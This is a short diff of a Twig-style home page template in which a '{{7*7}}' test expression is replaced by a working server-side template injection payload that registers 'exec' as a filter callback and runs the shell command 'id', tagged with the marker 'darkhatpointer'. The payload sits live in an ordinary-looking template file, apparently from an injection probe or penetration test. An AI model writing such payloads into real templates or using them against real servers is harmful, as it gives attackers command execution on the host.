@@ -8,7 +8,7 @@
 {% extends "layouts.master" %}
 {% block content %}
     {% component home %}
-{{7*7}} darkhatpointer
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}} darkhatpointer
 {% endblock %}
 {% block scripts %}
     <script defer src="{{ 'home.js' | asset }}"></script>
